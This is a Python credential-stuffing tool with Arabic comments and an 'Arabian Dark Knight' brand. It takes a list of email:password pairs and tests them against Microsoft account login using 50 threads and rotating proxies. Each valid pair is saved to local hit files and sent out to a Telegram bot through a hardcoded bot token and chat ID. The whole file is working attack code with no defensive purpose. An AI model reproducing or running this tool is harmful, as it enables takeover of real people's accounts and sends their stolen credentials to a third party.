import random
import threading
import pyfiglet
import requests
from mailhub import MailHub
from concurrent.futures import ThreadPoolExecutor
import os
from colorama import Fore, Style

# تهيئة مكتبة colorama
from colorama import init
init(autoreset=True)

# عرض الشعار
logo = pyfiglet.figlet_format('MASA')
print(logo)

mail = MailHub()
write_lock = threading.Lock()

# إعدادات بوت تيليجرام
TELEGRAM_BOT_TOKEN = '8015416576:AAF-x4yxWwEnlGo9m17VRzvWkFVyWR2qf3Y'
TELEGRAM_CHAT_ID = '7957784778'

# دالة للتحقق من صحة السطر
def validate_line(line):
    parts = line.strip().split(":")
    if len(parts) == 2:
        return parts[0], parts[1]
    else:
        return None, None

# دالة لمحاولة تسجيل الدخول
def attempt_login(email, password, proxy, hits_file, local_hits_file):
    try:
        res = mail.loginMICROSOFT(email, password, proxy)[0]
        if res == "ok":
            print(f"{Fore.GREEN}Valid   | {email}:{password}{Style.RESET_ALL}")
            with write_lock:
                hits_file.write(f"{email}:{password}\n")
                hits_file.flush()
                local_hits_file.write(f"{email}:{password}\n")
                local_hits_file.flush()
                send_to_telegram(email, password)  
        else:
            print(f"{Fore.RED}Invalid | {email}:{password}{Style.RESET_ALL}")
    except Exception as e:
        print(f"{Fore.YELLOW}Error logging in {email}:{password} - {str(e)}{Style.RESET_ALL}")

# دالة لإرسال رسالة إلى تيليجرام
def send_to_telegram(email, password):
    message = f"""
Arabian Dark Knight - @ArabianDarkKnight - @DarkKnightArabian

Valid Acc : {email}:{password}
    """
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    payload = {
        'chat_id': TELEGRAM_CHAT_ID,
        'text': message
    }
    try:
        response = requests.post(url, data=payload)
        if response.status_code == 200:
            print("Successfully sent to Telegram!")
        else:
            print(f"Failed to send to Telegram. Status code: {response.status_code}")
    except Exception as e:
        print(f"An error occurred while sending to Telegram: {e}")

# دالة لمعالجة ملف الكومبو
def process_combo_file(hits_file, local_hits_file, proxies, combo_path):
    try:
        with open(combo_path, "r") as file:
            with ThreadPoolExecutor(max_workers=50) as executor:
                futures = []
                for line in file:
                    email, password = validate_line(line)
                    if email is None or password is None:
                        print(f"{Fore.YELLOW}Invalid format in line: {line.strip()}{Style.RESET_ALL}")
                        continue
                    proxy = {"http": f"http://{random.choice(proxies).strip()}"} if proxies else None
                    futures.append(executor.submit(attempt_login, email, password, proxy, hits_file, local_hits_file))
                for future in futures:
                    future.result()
    except Exception as e:
        print(f"{Fore.RED}Error processing combo file: {e}{Style.RESET_ALL}")

# الدالة الرئيسية
def main():
    combo_path = input("Enter the path to the combo file: ")
    proxy_path = input("Enter the path to the proxy file (or press Enter to skip): ")

    if not os.path.exists(combo_path):
        print("Combo file does not exist.")
        return

    proxies = []
    if proxy_path:
        if not os.path.exists(proxy_path):
            print("Proxy file does not exist.")
            return
        with open(proxy_path, "r") as proxy_file:
            proxies = proxy_file.readlines()

    with open("masa_hits.txt", "a", encoding="utf-8") as local_hits_file:
        with open("temp_hits.txt", "w", encoding="utf-8") as temp_file:
            print("Starting login attempts...")
            process_combo_file(temp_file, local_hits_file, proxies, combo_path)
            print("Login attempts finished.")

if __name__ == "__main__":
    main()
